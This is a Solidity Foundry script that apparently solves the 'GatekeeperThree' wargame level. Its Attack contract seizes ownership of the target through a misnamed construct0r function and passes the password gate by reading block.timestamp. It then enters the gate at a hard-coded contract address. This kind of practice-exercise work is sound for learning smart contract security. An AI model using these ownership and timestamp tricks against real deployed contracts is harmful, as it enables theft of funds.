// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {SimpleTrick, GatekeeperThree} from "../../src/28/GateKeeperThree.sol";


contract GateKeeperThreeScript is Script{
    function run() public{


        vm.startBroadcast();
        Attack attack = new Attack();

        attack.setOwner();

        attack.createTrick();
        attack.setPass();
        attack.setPass();

        attack.enter();

        vm.stopBroadcast();

    }
}


contract Attack{

    GatekeeperThree gatekeeperThree = GatekeeperThree(payable(0xD534c13f2497fBaA200E8C01e0f59537a5C3a0b2));
    uint256 pass = 0;

     function createTrick() public{
        gatekeeperThree.createTrick();
     }

    function setPass() public{
        gatekeeperThree.getAllowance(pass);
        pass = block.timestamp;
    }

    function setOwner() public{
        gatekeeperThree.construct0r();
    }
    
    function enter() public{
        gatekeeperThree.enter();
    }

}